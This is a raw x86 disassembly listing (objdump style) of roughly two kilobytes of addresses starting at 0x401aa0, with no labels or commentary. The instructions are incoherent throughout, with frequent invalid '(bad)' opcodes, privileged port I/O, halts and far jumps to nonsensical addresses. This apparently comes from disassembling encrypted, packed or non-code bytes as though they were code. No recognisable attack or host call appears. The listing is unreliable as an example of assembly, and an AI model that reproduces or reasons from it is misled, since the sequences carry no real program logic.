  401aa0:	mov    dh,0xe9
  401aa2:	sbb    DWORD PTR [edx],edx
  401aa4:	mov    ds:0x2d9c0f54,al
  401aa9:	mov    ah,BYTE PTR gs:[ecx+edx*4+0x7f]
  401aae:	pop    ss
  401aaf:	cmp    eax,0x7532dee0
  401ab4:	pop    edx
  401ab5:	adc    edx,DWORD PTR [ebx-0x4c8fd5d9]
  401abb:	dec    eax
  401abc:	xchg   ebx,eax
  401abd:	jle    0x401afb
  401abf:	jecxz  0x401ac5
  401ac1:	jmp    0xd77490e8
  401ac6:	or     bh,BYTE PTR ds:0x27b35ad8
  401acc:	push   esi
  401acd:	jo     0x401a64
  401acf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401ad0:	or     BYTE PTR [esi],0xd6
  401ad3:	jmp    0x401a88
  401ad5:	jle    0x401b07
  401ad7:	bound  esp,QWORD PTR [ecx]
  401ad9:	add    al,0x49
  401adb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401adc:	cmp    dh,BYTE PTR [ebp-0x772e5146]
  401ae2:	mov    ds:0x678c0fda,al
  401ae7:	xor    DWORD PTR [edx+0x0],edx
  401aea:	mov    ebp,0x1c634fbb
  401aef:	mov    eax,0x46ae64b
  401af4:	or     dh,al
  401af6:	xchg   esi,eax
  401af7:	int    0x68
  401af9:	mov    edx,0xbc1e5b05
  401afe:	inc    ecx
  401aff:	push   ds
  401b00:	test   BYTE PTR [edx+0x44f0d87b],bh
  401b06:	push   ecx
  401b07:	jns    0x401adf
  401b09:	inc    eax
  401b0a:	je     0x401ad5
  401b0c:	out    dx,al
  401b0d:	in     eax,0xc2
  401b0f:	mov    al,ch
  401b11:	xlat   BYTE PTR ds:[ebx]
  401b12:	cld    
  401b13:	shr    eax,cl
  401b15:	mov    WORD PTR [ebx+0x6],ss
  401b18:	mov    edx,0x96c6630b
  401b1d:	push   eax
  401b1e:	push   ss
  401b1f:	xchg   BYTE PTR [esi],al
  401b21:	sub    esp,DWORD PTR [eax]
  401b23:	jle    0x401ad3
  401b25:	sbb    esi,DWORD PTR [ecx]
  401b27:	push   esi
  401b28:	adc    ecx,DWORD PTR [edx]
  401b2a:	outs   dx,DWORD PTR ds:[esi]
  401b2b:	add    BYTE PTR [eax+0x28],dl
  401b2e:	add    eax,0x30fbedd2
  401b33:	inc    esi
  401b34:	jg     0x401b4e
  401b36:	call   0xad2a:0x53d6923c
  401b3d:	loopne 0x401ad0
  401b3f:	pop    edi
  401b40:	xor    ebx,DWORD PTR [esi-0x7e]
  401b43:	dec    ecx
  401b44:	adc    al,0x69
  401b47:	add    DWORD PTR [esi-0x546fbc32],0x75
  401b4e:	xor    BYTE PTR [esi],ah
  401b50:	sahf   
  401b51:	daa    
  401b52:	mov    ecx,0x16fd6fed
  401b57:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401b58:	mov    esp,ecx
  401b5a:	dec    esp
  401b5b:	jbe    0x401bcf
  401b5d:	fistp  WORD PTR [eax+eax*1]
  401b60:	inc    esi
  401b61:	pop    ds
  401b62:	add    DWORD PTR [ebx-0x4743e964],esi
  401b68:	out    0x47,al
  401b6a:	ds clc 
  401b6c:	xchg   ecx,eax
  401b6d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401b6e:	adc    eax,0xea0614f4
  401b73:	push   cs
  401b74:	icebp  
  401b75:	xor    eax,0xade7f25c
  401b7a:	fiadd  DWORD PTR [esi]
  401b7c:	call   0xc706e2b9
  401b81:	push   esp
  401b82:	mov    dl,0x8b
  401b84:	iret   
  401b85:	mov    esp,0xc4c54bd7
  401b8a:	in     eax,0xb7
  401b8c:	call   0xdcb77f05
  401b91:	addr16 pop fs
  401b94:	jo     0x401b81
  401b96:	mov    DWORD PTR [edx+0x7000d5],eax
  401b9c:	cmp    dh,ch
  401b9e:	cmp    ebx,DWORD PTR [ecx-0x4ad9635c]
  401ba4:	cmc    
  401ba5:	adc    eax,0x70
  401ba8:	mov    ebx,0xb24ae423
  401bad:	mov    al,ds:0x2cf9f1fa
  401bb2:	jmp    0xe0111c34
  401bb7:	mov    bl,0xe7
  401bb9:	int3   
  401bba:	cs inc esi
  401bbc:	retf   0xd0b8
  401bbf:	xlat   BYTE PTR ds:[ebx]
  401bc0:	jnp    0x401b9e
  401bc2:	in     al,0xbe
  401bc4:	jb     0x401bfb
  401bc6:	dec    esp
  401bc7:	pop    es
  401bc8:	lock pop esi
  401bca:	and    al,al
  401bcc:	pop    dx
  401bce:	ret    
  401bcf:	cdq    
  401bd0:	lods   al,BYTE PTR ds:[esi]
  401bd1:	xor    DWORD PTR [edx-0x30027048],ebx
  401bd7:	gs ja  0x401c30
  401bda:	dec    ecx
  401bdb:	or     ebx,DWORD PTR [ebx]
  401bdd:	test   DWORD PTR [esi-0x2550fe52],0xb32b0a61
  401be7:	nop
  401be8:	(bad)  
  401be9:	pusha  
  401bea:	adc    al,0x74
  401bec:	pushf  
  401bed:	add    BYTE PTR [edi+0x4b18d40d],bh
  401bf3:	pushf  
  401bf4:	daa    
  401bf5:	jmp    0x88ffb457
  401bfa:	or     ch,BYTE PTR [edx-0x5c]
  401bfd:	aaa    
  401bfe:	mov    ch,BYTE PTR [ebx-0x62]
  401c01:	jge    0x401c2a
  401c03:	fidiv  DWORD PTR [ecx]
  401c05:	sbb    BYTE PTR [esi],dl
  401c07:	data16 js 0x401b96
  401c0a:	or     esi,esi
  401c0c:	pop    esp
  401c0d:	inc    edx
  401c0e:	mov    ds:0xa6bfc6b3,eax
  401c13:	fcomp  QWORD PTR [ebp+0x76]
  401c16:	sbb    BYTE PTR [bx+0x3dcd],0x50
  401c1c:	mov    cl,bh
  401c1e:	adc    al,0x79
  401c20:	add    cl,BYTE PTR [ecx+0x3f]
  401c23:	mov    edi,DWORD PTR [bp+di-0x4a74]
  401c28:	sahf   
  401c29:	sar    edx,1
  401c2b:	sub    cl,bh
  401c2d:	xchg   edx,eax
  401c2e:	jbe    0x401cad
  401c30:	cmp    DWORD PTR ds:0xf49b1537,edx
  401c36:	or     BYTE PTR [ecx+0x46f5d7d8],ah
  401c3c:	pop    ebp
  401c3d:	xchg   ebp,eax
  401c3e:	sub    bl,BYTE PTR [ecx+0xd0f03d4]
  401c44:	lods   al,BYTE PTR ds:[esi]
  401c45:	arpl   WORD PTR [edx-0x641eec27],dx
  401c4b:	test   BYTE PTR [edi-0x4210b3bb],bh
  401c51:	mov    al,ds:0x6eb456c8
  401c56:	cld    
  401c57:	push   0x5ed3a2a8
  401c5c:	mov    bh,0x5
  401c5e:	mov    bl,0x44
  401c60:	jecxz  0x401c72
  401c62:	push   esi
  401c63:	out    0x2d,eax
  401c65:	mov    edi,0xa7f7b92b
  401c6a:	adc    DWORD PTR [esp+edx*4+0xe1b7a62],ebx
  401c71:	pop    edi
  401c72:	push   0x9
  401c74:	in     al,0xcb
  401c76:	popf   
  401c77:	pusha  
  401c78:	stos   DWORD PTR es:[edi],eax
  401c79:	repz std 
  401c7b:	dec    ebx
  401c7c:	sbb    ecx,DWORD PTR [eax+0x79]
  401c7f:	ror    edi,0xfc
  401c82:	sbb    dh,ah
  401c84:	repz xchg ecx,eax
  401c86:	jecxz  0x401c84
  401c88:	das    
  401c89:	push   cs
  401c8a:	mov    eax,0xfd77a9fe
  401c8f:	push   ds
  401c90:	push   edx
  401c91:	sub    DWORD PTR [edi-0xcae5705],ebx
  401c97:	addr16 (bad) 
  401c9a:	mov    ebp,0x9fee21b
  401c9f:	cwde   
  401ca0:	lds    esp,FWORD PTR [ecx+0x3985ceab]
  401ca6:	arpl   WORD PTR ds:0xaef29e37,si
  401cac:	scas   eax,DWORD PTR es:[edi]
  401cad:	xor    eax,0x3e797c75
  401cb2:	mov    esi,0x46e0bc1d
  401cb7:	(bad)  
  401cb8:	in     al,0x2a
  401cba:	cwde   
  401cbb:	(bad)  
  401cbc:	pop    ecx
  401cbd:	push   edi
  401cbe:	mov    ds:0x58f6cfe1,eax
  401cc3:	inc    ebx
  401cc4:	jne    0x401d1f
  401cc6:	xchg   esp,eax
  401cc7:	fnstsw WORD PTR [ebp-0x72]
  401cca:	or     BYTE PTR [ebx+0x65],0xa7
  401cce:	push   esp
  401ccf:	mov    al,0x29
  401cd1:	or     al,0x4e
  401cd3:	adc    ebx,DWORD PTR [edx-0x6a]
  401cd6:	cmp    ecx,DWORD PTR [ebp-0x25]
  401cd9:	lds    ecx,FWORD PTR [edi]
  401cdb:	mov    eax,fs:0x9e6df677
  401ce1:	in     al,0x0
  401ce3:	std    
  401ce4:	hlt    
  401ce5:	pop    eax
  401ce6:	shl    ebx,cl
  401ce8:	lods   al,BYTE PTR ds:[esi]
  401ce9:	xor    BYTE PTR [ecx],ah
  401ceb:	xchg   BYTE PTR [eax+ebx*8-0x6463de9c],ch
  401cf2:	cmp    bl,BYTE PTR [ecx+0x10]
  401cf5:	sahf   
  401cf6:	(bad)  
  401cf8:	mov    al,0x53
  401cfa:	sub    edx,esp
  401cfc:	jne    0x401d1b
  401cfe:	icebp  
  401cff:	in     eax,dx
  401d00:	jecxz  0x401d1c
  401d02:	lods   eax,DWORD PTR ds:[esi]
  401d03:	imul   edx,DWORD PTR [eax+0x624ccd53],0x15
  401d0a:	stc    
  401d0b:	ret    0x4385
  401d0e:	lods   al,BYTE PTR ds:[esi]
  401d0f:	or     ch,ah
  401d11:	jbe    0x401d50
  401d13:	mov    esp,0x5e640af3
  401d18:	in     eax,dx
  401d19:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401d1a:	mov    BYTE PTR [eax+eax*2],ah
  401d1d:	or     eax,0xaa38e1aa
  401d22:	cmp    DWORD PTR [edi+0x59],edx
  401d25:	mov    DWORD PTR [edx-0x1a],ebp
  401d28:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401d2a:	in     al,0x16
  401d2c:	jmp    0xac45:0xa990774e
  401d33:	test   BYTE PTR [edi],ch
  401d35:	imul   edx,DWORD PTR [ebp+0x31],0xffffffdd
  401d39:	mov    ds:0x37ef0563,al
  401d3e:	push   cs
  401d3f:	in     eax,dx
  401d40:	in     al,dx
  401d41:	add    DWORD PTR [edi+0x3b],esp
  401d44:	jecxz  0x401d5c
  401d46:	test   DWORD PTR [ebx+0x387707df],edi
  401d4c:	outs   dx,BYTE PTR ds:[esi]
  401d4d:	fnsetpm(287 only) 
  401d4f:	mov    ch,BYTE PTR [edx+0x376523ee]
  401d55:	inc    eax
  401d56:	ret    
  401d57:	in     al,0x11
  401d59:	out    dx,al
  401d5a:	repnz fld TBYTE PTR [esi+0x7c]
  401d5e:	pop    ss
  401d5f:	into   
  401d60:	imul   ebx,ebx,0x2cbf35a2
  401d66:	mov    edx,0x4ce0b8f3
  401d6b:	aad    0xb
  401d6d:	and    BYTE PTR [ebp+0x2e],0x96
  401d71:	pop    ecx
  401d72:	inc    esi
  401d73:	je     0x401d0e
  401d75:	add    eax,0x4956aab1
  401d7a:	adc    edi,0x3df4a3bf
  401d80:	mov    ecx,0xacb8d085
  401d85:	or     al,0x8c
  401d87:	adc    DWORD PTR [ebx-0x618654ef],0x96457020
  401d91:	push   0xe83d41d0
  401d96:	gs in  al,0x6
  401d99:	dec    ecx
  401d9a:	(bad)  
  401d9b:	hlt    
  401d9c:	ins    BYTE PTR es:[edi],dx
  401d9d:	mov    ah,0x74
  401d9f:	fisub  WORD PTR [ecx]
  401da1:	popf   
  401da2:	iret   
  401da3:	out    0x4b,eax
  401da5:	cli    
  401da6:	ss scas al,BYTE PTR es:[edi]
  401da8:	scas   eax,DWORD PTR es:[edi]
  401da9:	and    bl,BYTE PTR [ebx-0x3f44a2e4]
  401daf:	cmc    
  401db0:	adc    edx,DWORD PTR [edx]
  401db2:	and    BYTE PTR [eax+0x24],dh
  401db5:	push   ebp
  401db6:	dec    ebp
  401db7:	test   BYTE PTR [esi-0xa],0x5b
  401dbb:	jecxz  0x401dfc
  401dbd:	pop    edx
  401dbe:	and    DWORD PTR [ebx+esi*2-0x58],esi
  401dc2:	xchg   edx,eax
  401dc3:	sbb    al,0xb1
  401dc5:	push   edi
  401dc6:	or     BYTE PTR [eax],dl
  401dc8:	cmp    ah,BYTE PTR [eax+0x20817197]
  401dce:	(bad)  
  401dd0:	out    dx,al
  401dd1:	in     eax,0xcc
  401dd3:	cmp    esi,ebp
  401dd5:	adc    bl,BYTE PTR [ecx*2-0x2461ffde]
  401ddc:	loop   0x401d6e
  401dde:	lods   al,BYTE PTR ds:[esi]
  401ddf:	fs push 0x73
  401de2:	(bad)  
  401de4:	sbb    dh,BYTE PTR [esi]
  401de6:	mov    ds:0xc6a047cc,al
  401deb:	popf   
  401dec:	or     BYTE PTR [esi+eiz*1-0x66b8602d],0xcc
  401df4:	mov    ds:0xfc953a7c,eax
  401df9:	jle    0x401dd7
  401dfb:	outs   dx,DWORD PTR ds:[esi]
  401dfc:	mov    ss,WORD PTR [esi+0x7460a757]
  401e02:	int    0xe7
  401e04:	shl    DWORD PTR [edx+0x102fa0de],cl
  401e0a:	dec    eax
  401e0b:	retf   
  401e0c:	mov    esi,0x89ab72ed
  401e11:	int3   
  401e12:	mov    esp,0x17946859
  401e17:	into   
  401e18:	aas    
  401e19:	add    ah,al
  401e1b:	sbb    DWORD PTR [edx],edx
  401e1d:	les    eax,FWORD PTR [edx+edx*8+0x60557612]
  401e24:	daa    
  401e25:	ins    DWORD PTR es:[edi],dx
  401e26:	imul   BYTE PTR [esi-0x55]
  401e29:	mov    edi,0xc018b986
  401e2e:	xchg   esp,eax
  401e2f:	add    ch,dl
  401e31:	push   ss
  401e32:	clc    
  401e33:	mov    cl,0xc3
  401e35:	inc    edi
  401e36:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401e37:	scas   al,BYTE PTR es:[edi]
  401e38:	out    dx,al
  401e39:	in     al,dx
  401e3a:	(bad)  
  401e3b:	cmp    eax,0x28fa18ba
  401e40:	rcr    BYTE PTR [eax-0xd],1
  401e43:	bound  esp,QWORD PTR [eax-0x7cacb655]
  401e49:	lahf   
  401e4a:	adc    al,0x8
  401e4c:	ss pushf 
  401e4e:	shr    DWORD PTR [ecx],cl
  401e50:	shr    DWORD PTR [edi-0x381033c8],cl
  401e56:	(bad)  
  401e57:	ja     0x401df4
  401e59:	mov    ah,BYTE PTR [edi-0x1c]
  401e5c:	xor    al,BYTE PTR [edi+0x66]
  401e5f:	ret    0x9119
  401e62:	xchg   DWORD PTR [edi-0x7d3ff111],ebp
  401e68:	(bad)  
  401e69:	cld    
  401e6a:	dec    ebx
  401e6b:	stos   BYTE PTR es:[edi],al
  401e6c:	into   
  401e6d:	call   0x8a3ce0f6
  401e72:	and    edx,edx
  401e74:	jp     0x401e5a
  401e76:	xor    ebp,DWORD PTR [edx-0x16378c70]
  401e7c:	psubw  mm0,mm2
  401e7f:	fwait
  401e80:	ss in  eax,0x83
  401e83:	dec    ecx
  401e84:	adc    BYTE PTR [edx+edi*2],bh
  401e87:	pop    eax
  401e88:	out    0xd7,al
  401e8a:	jo     0x401e93
  401e8c:	push   edi
  401e8d:	lods   eax,DWORD PTR ds:[esi]
  401e8e:	lock repnz xchg ecx,eax
  401e91:	xchg   edx,eax
  401e92:	or     al,0xda
  401e94:	xchg   esi,eax
  401e95:	dec    edi
  401e96:	mov    dl,0x90
  401e98:	(bad)  
  401e99:	sbb    BYTE PTR [eax],al
  401e9b:	in     eax,dx
  401e9c:	jecxz  0x401ebe
  401e9e:	cli    
  401e9f:	mov    eax,ds:0x96e98268
  401ea4:	cmp    dl,BYTE PTR [esi-0x64]
  401ea7:	rol    BYTE PTR ss:[ebp+esi*2+0x75311ff0],cl
  401eaf:	mov    esp,0xbaa92e7e
  401eb4:	push   edx
  401eb5:	ror    DWORD PTR [ecx-0x5a],1
  401eb8:	test   BYTE PTR [ebp+0x65a0ef4c],dh
  401ebe:	inc    edx
  401ebf:	push   0x699e84d6
  401ec4:	mov    gs,WORD PTR [ebx+0x628b7222]
  401eca:	pop    ss
  401ecb:	int    0x51
  401ecd:	cmp    DWORD PTR [edi-0x167c2444],0x38
  401ed4:	push   edx
  401ed5:	and    esi,ebx
  401ed7:	dec    esi
  401ed8:	xor    ax,0xf57
  401edc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401edd:	loop   0x401ea5
  401edf:	inc    esp
  401ee0:	cmp    BYTE PTR [ebx],bl
  401ee2:	add    DWORD PTR [edi+ebx*8+0x52],0x1087dd66
  401eea:	inc    ebp
  401eeb:	xor    eax,0x8af7a677
  401ef0:	in     eax,dx
  401ef1:	inc    eax
  401ef2:	daa    
  401ef3:	mov    ah,0x5e
  401ef5:	or     DWORD PTR [edi],0xffffff88
  401ef8:	sbb    DWORD PTR [ebx-0x7dc9e1a],esp
  401efe:	push   esi
  401eff:	sbb    ebp,edx
  401f01:	pop    ecx
  401f02:	xchg   ebx,eax
  401f03:	mov    ebp,0xb7d5a2d9
  401f08:	inc    edx
  401f09:	pop    ds
  401f0a:	mov    DWORD PTR [esi-0x24ee3531],ebx
  401f10:	mov    dl,dh
  401f12:	sbb    BYTE PTR [edx],0x82
  401f15:	adc    eax,0x1d4db386
  401f1a:	test   eax,0xe7001bf2
  401f1f:	dec    esp
  401f20:	jmp    0x401f6c
  401f22:	dec    ebp
  401f23:	cmp    eax,0x5fa296de
  401f28:	bound  esi,QWORD PTR [ebx-0x2b92d00]
  401f2e:	dec    ebp
  401f2f:	fwait
  401f30:	mov    WORD PTR [ecx+0x51a764b6],ss
  401f36:	sub    esi,edx
  401f38:	mov    dl,0x7c
  401f3a:	aaa    
  401f3b:	cld    
  401f3c:	dec    eax
  401f3d:	enter  0xa8f7,0xdb
  401f41:	or     DWORD PTR [ebx],edi
  401f43:	stos   DWORD PTR es:[edi],eax
  401f44:	xchg   edi,eax
  401f45:	aad    0x49
  401f47:	jns    0x401efe
  401f49:	xor    dh,BYTE PTR [edi+0x1d517130]
  401f4f:	mov    ds:0x93717a4b,al
  401f54:	or     al,cl
  401f56:	(bad)  
  401f57:	xor    DWORD PTR [ebp+0x5d],eax
  401f5a:	ror    BYTE PTR [esi+eax*4+0x8],0xfe
  401f5f:	xor    BYTE PTR [ecx],ah
  401f61:	dec    ebp
  401f62:	lods   eax,DWORD PTR ds:[esi]
  401f63:	lods   eax,DWORD PTR ds:[esi]
  401f64:	pop    es
  401f65:	mov    WORD PTR [ecx+0x3c],?
  401f68:	xor    eax,0xd59c00c3
  401f6d:	(bad)  
  401f6e:	dec    ecx
  401f6f:	not    BYTE PTR [ebx+0x3f]
  401f72:	(bad)  
  401f73:	rol    DWORD PTR [ebx],cl
  401f75:	add    eax,0xfd41ebc3
  401f7a:	lock iret 
  401f7c:	mov    eax,0x3344d68b
  401f81:	stos   DWORD PTR es:[edi],eax
  401f82:	aam    0x6a
  401f84:	lods   al,BYTE PTR ds:[esi]
  401f85:	shl    edi,0xf2
  401f88:	push   esi
  401f89:	lods   al,BYTE PTR ds:[esi]
  401f8a:	gs std 
  401f8c:	call   0x1789cb77
  401f91:	jbe    0x401f1d
  401f93:	shl    edx,0x3b
  401f96:	adc    edi,DWORD PTR [edx]
  401f98:	or     DWORD PTR [esi+0x50],esp
  401f9b:	fisub  WORD PTR [ecx+0x1e290524]
  401fa1:	dec    edx
  401fa2:	cmc    
  401fa3:	sar    BYTE PTR [ebx],1
  401fa5:	jmp    0xe584:0x630ed997
  401fac:	gs xor al,0xb1
  401faf:	fimul  DWORD PTR [edx]
  401fb1:	mov    WORD PTR [edi-0x2f48346e],ds
  401fb7:	sub    BYTE PTR [ecx],dl
  401fb9:	pop    ecx
  401fba:	dec    esi
  401fbb:	mov    edx,0x42277ab7
  401fc0:	out    0x5e,al
  401fc2:	jne    0x401f74
  401fc4:	dec    eax
  401fc5:	je     0x402013
  401fc7:	jl     0x402005
  401fc9:	push   ss
  401fca:	mov    ch,ch
  401fcc:	out    dx,al
  401fcd:	sbb    esp,0x582be804
  401fd3:	pop    ecx
  401fd4:	dec    edx
  401fd5:	mov    ah,0xb6
  401fd7:	push   ds
  401fd8:	mov    edi,0x64c55a7d
  401fdd:	rcr    BYTE PTR [esi-0x7f],cl
  401fe0:	adc    edi,0xffffff84
  401fe3:	or     DWORD PTR [eax-0x4543c8f8],ecx
  401fe9:	push   edi
  401fea:	pop    edi
  401feb:	adc    BYTE PTR [edi-0x3e32dcef],0x64
  401ff2:	aad    0x3b
  401ff4:	(bad)  
  401ff5:	xchg   edx,eax
  401ff6:	mov    dh,0xc6
  401ff8:	lods   eax,DWORD PTR ds:[esi]
  401ff9:	or     al,0x90
  401ffb:	popf   
  401ffc:	ror    BYTE PTR [esi+0x35f1fa66],1
  402002:	fdivr  DWORD PTR [esi]
  402004:	les    edx,FWORD PTR [esi+0x109ae5a7]
  40200a:	jno    0x401fdd
  40200c:	lods   al,BYTE PTR ds:[esi]
  40200d:	cwde   
  40200e:	popf   
  40200f:	fimul  DWORD PTR [ecx-0x3a]
  402012:	adc    DWORD PTR ds:0x63e1722d,esp
  402018:	cmp    DWORD PTR [ecx+0x5979440b],ecx
  40201e:	push   ecx
  40201f:	jne    0x40200f
  402021:	pop    ebp
  402022:	(bad)  
  402023:	mov    ch,0x22
  402025:	hlt    
  402026:	ret    0x254f
  402029:	lods   eax,DWORD PTR ds:[esi]
  40202a:	loope  0x4020a4
  40202c:	gs push cx
  40202f:	mov    cl,BYTE PTR [edi-0x4be42495]
  402035:	jmp    0x402003
  402037:	jne    0x401fc6
  402039:	jp     0x401ff2
  40203b:	cmp    ah,cl
  40203d:	or     eax,0x1d1687e1
  402042:	xor    al,0xa0
  402044:	cmc    
  402045:	cmp    cl,BYTE PTR [ebx]
  402047:	adc    eax,0x6287c1f8
  40204c:	dec    edx
  40204d:	aaa    
  40204e:	adc    al,0x52
  402050:	ins    BYTE PTR es:[edi],dx
  402051:	jmp    0x4020a1
  402053:	pusha  
  402054:	test   DWORD PTR [eax-0x4b],edi
  402057:	mov    bl,0x42
  402059:	add    eax,DWORD PTR [ebp+0x44]
  40205c:	or     eax,0xb442ff22
  402061:	sub    DWORD PTR [eax-0x5ae945fc],eax
  402067:	or     al,ah
  402069:	mov    dl,cl
  40206b:	mov    bl,0xde
  40206d:	xchg   edx,eax
  40206e:	xchg   ebx,eax
  40206f:	in     al,dx
  402070:	cld    
  402071:	push   edi
  402072:	std    
  402073:	xor    esi,ebp
  402075:	(bad)  
  402076:	push   ecx
  402077:	aam    0xe5
  402079:	jp     0x402017
  40207b:	xor    esi,ecx
  40207d:	mov    edi,0x980ab7e
  402082:	mov    ch,0xfc
  402084:	pop    es
  402085:	sbb    eax,0xcdc712c1
  40208a:	stos   DWORD PTR es:[edi],eax
  40208b:	js     0x4020f4
  40208d:	xlat   BYTE PTR ds:[ebx]
  40208e:	clc    
  40208f:	dec    esi
  402090:	xchg   edx,eax
  402091:	ins    DWORD PTR es:[edi],dx
  402092:	push   0x29
  402094:	xor    DWORD PTR [eax+0x6a],0x22
  402098:	iret   
  402099:	das    
  40209a:	jl     0x4020f5
  40209c:	fwait
  40209d:	jns    0x40204f
  40209f:	mov    bl,0x7
  4020a1:	dec    ebx
  4020a2:	jnp    0x40205b
  4020a4:	cmp    eax,0xcae73294
  4020a9:	xchg   edi,eax
  4020aa:	ss push ds
  4020ac:	mov    ds:0x38fed753,al
  4020b1:	and    eax,0xf614dd91
  4020b6:	lahf   
  4020b7:	or     BYTE PTR [esi-0x5],ah
  4020ba:	pop    ss
  4020bb:	(bad)  
  4020bd:	clc    
  4020be:	adc    al,0x28
  4020c0:	mov    esi,DWORD PTR [ebx+0x6d859d5e]
  4020c6:	out    dx,al
  4020c7:	int3   
  4020c8:	lds    ebx,FWORD PTR [esp+eax*1]
  4020cb:	rcl    bh,0x74
  4020ce:	add    esi,DWORD PTR [eax]
  4020d0:	mov    edi,DWORD PTR [ecx]
  4020d2:	loop   0x4020bd
  4020d4:	sbb    al,0xab
  4020d6:	pop    edi
  4020d7:	inc    esi
  4020d8:	xor    al,0xc3
  4020da:	dec    ecx
  4020db:	xchg   edi,eax
  4020dc:	jnp    0x40215d
  4020de:	repnz and esp,edi
  4020e1:	enter  0xf421,0x32
  4020e5:	sbb    eax,0x94c69579
  4020ea:	imul   ecx,DWORD PTR [edx],0xfffffff3
  4020ed:	cmp    eax,0x594e82f6
  4020f2:	cwde   
  4020f3:	leave  
  4020f4:	mov    ecx,0x29a33e40
  4020f9:	lahf   
  4020fa:	sbb    DWORD PTR [edi-0x478fc264],edi
  402100:	mov    dl,0x9a
  402102:	lahf   
  402103:	nop
  402104:	(bad)  
  402106:	or     BYTE PTR [edx-0x12],bh
  402109:	inc    ebp
  40210a:	sbb    eax,0xb42204eb
  40210f:	jae    0x40210c
  402111:	or     al,ah
  402113:	mov    dh,0x3b
  402115:	fld    DWORD PTR [esi]
  402117:	(bad)  
  402118:	ds dec edi
  40211a:	push   eax
  40211b:	pop    edi
  40211c:	mov    bl,0x25
  40211e:	jmp    esi
  402120:	mov    al,0xa7
  402122:	popa   
  402123:	rcr    BYTE PTR [esi],cl
  402125:	call   0x1d7ac02f
  40212a:	inc    edx
  40212b:	mov    BYTE PTR [edx+0x429b19a6],ah
  402131:	mov    edx,0x5c88e459
  402136:	lods   eax,DWORD PTR ds:[esi]
  402137:	ins    BYTE PTR es:[edi],dx
  402138:	pop    esi
  402139:	retf   0x3c2b
  40213c:	or     dl,BYTE PTR [eax+0x6b726ca0]
  402142:	cmp    BYTE PTR [ebx+0x1a],bl
  402145:	inc    ecx
  402146:	ds test eax,0x9044ac63
  40214c:	ror    ecx,1
  40214e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40214f:	(bad)  
  402150:	aam    0xe
  402152:	mov    ebx,0x2b8a4eeb
  402157:	dec    ecx
  402158:	ffreep st(6)
  40215a:	xor    eax,0x5152cf81
  40215f:	cwd    
  402161:	mov    edx,0x8a9eab4b
  402166:	sar    dh,1
  402168:	adc    ebp,DWORD PTR [edi+0x43]
  40216b:	imul   esi,DWORD PTR [esp],0xffffff95
  40216f:	sub    edi,DWORD PTR [edi-0x15]
  402172:	push   edx
  402173:	adc    esp,eax
  402175:	cmp    edx,DWORD PTR [eax]
  402177:	call   0x9edb:0x787ede87
  40217e:	js     0x4021c5
  402180:	fidiv  WORD PTR [ecx+0x5e]
  402183:	popf   
  402184:	adc    dh,al
  402186:	popa   
  402187:	adc    DWORD PTR [edx+0x1cf7189d],edx
  40218d:	mov    bl,0xb5
  40218f:	mov    edx,0x2ea80cb8
  402194:	cs pop edx
  402196:	pop    esp
  402197:	loopne 0x402169
  402199:	fstp   TBYTE PTR [edi+ebx*8-0x34e00cd3]
  4021a0:	lea    ebx,[esi]
  4021a2:	xor    DWORD PTR [ecx-0x52],edx
  4021a5:	lods   al,BYTE PTR ds:[esi]
  4021a6:	pop    esp
  4021a7:	fist   WORD PTR [ebx+0x65]
  4021aa:	inc    esi
  4021ab:	cmp    BYTE PTR [edx+0x6d],dh
  4021ae:	dec    ebp
  4021af:	sub    bl,BYTE PTR [ecx+0x1e540053]
  4021b5:	iret   
  4021b6:	stos   BYTE PTR es:[edi],al
  4021b7:	outs   dx,DWORD PTR ds:[esi]
  4021b8:	mov    bh,0x19
  4021ba:	jmp    0x5266:0x489507f3
  4021c1:	sbb    ah,bh
  4021c3:	(bad)  
  4021c4:	(bad)  
  4021c5:	cmp    eax,0xaae0907
  4021ca:	sar    WORD PTR [esp+esi*8],cl
  4021ce:	mov    eax,ds:0x555b036b
  4021d3:	jmp    0xe278:0xba3e6f26
  4021da:	and    BYTE PTR [ecx],0x22
  4021dd:	enter  0x2c1a,0x34
  4021e1:	call   0x28110eb1
  4021e6:	out    dx,eax
  4021e7:	lea    edi,[ecx+0x16]
  4021ea:	retf   0x86ed
  4021ed:	pop    ss
  4021ee:	in     al,0x1b
  4021f0:	xor    BYTE PTR [esi-0x72],bh
  4021f3:	mov    edi,0xb51c6584
  4021f8:	xchg   edi,eax
  4021f9:	les    ebx,FWORD PTR [ebp+0x17eefbfe]
  4021ff:	sbb    ecx,DWORD PTR [ecx+eiz*4-0x72fef697]
  402206:	mov    BYTE PTR [ebp+0xf],dl
  402209:	inc    eax
  40220a:	shl    al,0x13
  40220d:	lds    eax,FWORD PTR [edx+0x1b]
  402210:	(bad)  
  402212:	dec    edx
  402213:	mov    dh,0xb0
  402215:	loop   0x4021d3
  402217:	inc    ecx
  402218:	int3   
  402219:	adc    edx,DWORD PTR [edx]
  40221b:	cwde   
  40221c:	(bad)  
  40221d:	mov    gs,eax
  40221f:	mov    ah,0xbc
  402221:	daa    
  402222:	scas   eax,DWORD PTR es:[edi]
  402223:	dec    esp
  402224:	stc    
  402225:	fwait
  402226:	and    edx,DWORD PTR [edi]
  402228:	das    
  402229:	sub    ebx,edx
  40222b:	dec    ebp
  40222c:	imul   ecx,DWORD PTR [eax+0xb7993d1],0xffffff93
  402233:	outs   dx,DWORD PTR ds:[esi]
  402234:	pop    edx
  402235:	push   ebx
  402236:	pop    ebx
  402237:	in     eax,dx
  402238:	fs enter 0x28a8,0x3b
  40223d:	and    DWORD PTR [ebp-0x590b63f5],0xf8645ad4
  402247:	jp     0x40220d
  402249:	fwait
  40224a:	cmp    DWORD PTR [ebp+0x9],edi
  40224d:	sbb    eax,0x8c32cd71
  402252:	mov    ah,0x82
  402254:	dec    ebp
  402255:	mov    ah,0x17
  402257:	push   0x9c56ef71
  40225c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40225d:	push   esi
  40225e:	aad    0x76
  402260:	mov    ebx,0x215286fd
  402265:	dec    esi
  402266:	shl    BYTE PTR [eax-0xafef801],cl
